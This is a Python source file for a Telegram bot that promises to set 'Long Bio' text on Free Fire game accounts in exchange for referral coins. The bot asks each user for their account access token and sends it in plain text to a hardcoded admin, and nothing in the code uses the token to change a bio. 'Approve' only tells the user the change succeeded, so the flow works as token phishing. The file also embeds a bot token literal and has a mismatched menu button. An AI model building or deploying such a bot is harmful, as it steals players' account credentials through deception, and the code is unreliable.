import telebot
import os
from telebot import types

TOKEN = os.getenv("8372491245:AAETENEjfIFMPXKKy-KRrj4X_Bu4AkvThTE")
ADMIN_ID = 7153997488

bot = telebot.TeleBot(TOKEN)

user_step = {}
requests = {}
coins = {}
refer_count = {}
referred = {}

# START
@bot.message_handler(commands=['start'])
def start(message):

    user_id = message.from_user.id

    # REFER SYSTEM
    if message.text.startswith("/start "):
        ref = message.text.split(" ")[1]

        if ref != str(user_id):
            if user_id not in referred:

                referred[user_id] = ref

                coins[int(ref)] = coins.get(int(ref),0) + 20
                refer_count[int(ref)] = refer_count.get(int(ref),0) + 1

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)

    markup.add("🪙 Long Bio FF")
    markup.add("💵 Refer And Earn","💰 Balance")
    markup.add("🆘 Help")

    if user_id == ADMIN_ID:
        markup.add("🛠 Admin Panel")

    bot.send_message(
        message.chat.id,
        "Welcome To Long Bio Bot 🥳",
        reply_markup=markup
    )


# BALANCE
@bot.message_handler(func=lambda m: m.text == "💰 Balance")
def balance(message):

    user_id = message.from_user.id

    bal = coins.get(user_id,0)
    ref = refer_count.get(user_id,0)

    bot.send_message(
        message.chat.id,
        f"💰 Balance: {bal} coins\n👥 Total Refer: {ref}\n\n1 Refer = 20 Coins"
    )


# REFER
@bot.message_handler(func=lambda m: m.text == "💵 Refer And Earn")
def refer(message):

    link = f"https://t.me/{bot.get_me().username}?start={message.from_user.id}"

    bot.send_message(
        message.chat.id,
        f"Invite Friends & Earn\n\nYour Link:\n{link}\n\n1 Refer = 20 Coins"
    )


# LONG BIO
@bot.message_handler(func=lambda m: m.text == "🎁 Long Bio FF")
def longbio(message):

    user_id = message.from_user.id

    if coins.get(user_id,0) < 10:
        bot.send_message(
            message.chat.id,
            "❌ Need 10 Coins\nUse Refer System"
        )
        return

    user_step[user_id] = "token"
    bot.send_message(message.chat.id,"Enter Your Access Token ✅")


# HELP
@bot.message_handler(func=lambda m: m.text == "🆘 Help")
def help_cmd(message):
    bot.send_message(message.chat.id,"Any Problem?\n@Zxt_Tour_Help")


# TOKEN + BIO
@bot.message_handler(func=lambda m: True)
def handler(message):

    user_id = message.from_user.id
    step = user_step.get(user_id)

    if step == "token":
        requests[user_id] = {"token":message.text}
        user_step[user_id] = "bio"
        bot.send_message(message.chat.id,"Enter Your Long Bio 📱")
        return

    if step == "bio":

        token = requests[user_id]["token"]
        bio = message.text

        # deduct coins
        coins[user_id] = coins.get(user_id,0) - 10

        requests[user_id]["bio"] = bio

        markup = types.InlineKeyboardMarkup()
        approve = types.InlineKeyboardButton(
            "✅ Approve",
            callback_data=f"approve_{user_id}"
        )
        cancel = types.InlineKeyboardButton(
            "❌ Cancel",
            callback_data=f"cancel_{user_id}"
        )

        markup.add(approve,cancel)

        bot.send_message(
            ADMIN_ID,
            f"🔔 New Request\n\nUser: {user_id}\n\nToken:\n{token}\n\nBio:\n{bio}",
            reply_markup=markup
        )

        user_step[user_id] = None

        bot.send_message(
            message.chat.id,
            "Request Sent To Admin ✅"
        )


# CALLBACK
@bot.callback_query_handler(func=lambda call: True)
def callback(call):

    data = call.data

    # APPROVE
    if data.startswith("approve_"):

        user_id = int(data.split("_")[1])

        bot.send_message(
            user_id,
            "Your Bio Successfully Changed ✅"
        )

        bot.answer_callback_query(call.id,"Approved")


    # CANCEL (refund coins)
    if data.startswith("cancel_"):

        user_id = int(data.split("_")[1])

        coins[user_id] = coins.get(user_id,0) + 10

        bot.send_message(
            user_id,
            "❌ Request Cancelled\n💰 10 Coins Refunded"
        )

        bot.answer_callback_query(call.id,"Cancelled")


bot.infinity_polling()
